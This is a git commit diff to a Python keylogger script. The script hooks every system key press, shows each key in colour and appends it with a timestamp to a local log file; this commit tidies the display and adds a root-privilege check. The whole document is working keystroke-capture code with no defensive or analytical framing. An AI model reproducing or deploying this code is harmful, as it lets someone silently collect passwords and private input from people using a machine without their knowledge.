536384c99ef2dbc8914a98762278e1b52ef74da6
Gill-Singh-A <amansg22@iitk.ac.in>
2023-06-11 01:40:12 +0530

    Improved Displaying Keystrikes and Fixed crashing on non-root users

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,10 @@
-import keyboard, time
+import keyboard
+from os import geteuid
 from datetime import date
-from colorama import Fore, Style
+from time import strftime, localtime
+from colorama import Fore, Style, Back
 
-status_colors = {
+status_color = {
     "+": Fore.GREEN,            # Success
     "-": Fore.RED,              # Failure
     "*": Fore.YELLOW,           # Warning
@@ -10,12 +12,14 @@ status_colors = {
     " ": Fore.WHITE             # Normal
 }
 
-def display(status, data):
-    print(f"{status_colors[status]}[{status}] {Fore.BLUE}[{date.today()} {time.strftime('%H:%M:%S', time.localtime())}] {status_colors[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")
+def display(status, data, start='', end='\n'):
+    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
 
+def check_root():
+	return geteuid() == 0
 class keylogger:
     def __init__(self):
-        self.file_name = str(date.today()) + "_" + time.strftime('%H_%M_%S', time.localtime()) + ".txt"
+        self.file_name = str(date.today()) + "_" + strftime('%H_%M_%S', localtime()) + ".txt"
         keyboard.on_press(callback=self.write)
         while True:
             try:
@@ -23,10 +27,13 @@ class keylogger:
             except KeyboardInterrupt:
                 pass
     def write(self, event):
-        log = f"[{date.today()}] [{time.strftime('%H:%M:%S', time.localtime())}] : {event.name}\n"
-        display('+', log)
+        log = f"[{date.today()}] [{strftime('%H:%M:%S', localtime())}] : {event.name}\n"
+        display('+', f"{Back.MAGENTA}{event.name}{Back.RESET}")
         with open(self.file_name, 'a') as file:
             file.write(log)
 
 if __name__ == "__main__":
+    if not check_root():
+        display('-', f"This Program requires {Back.MAGENTA}root{Back.RESET} Privileges")
+        exit(0)
     listener = keylogger()
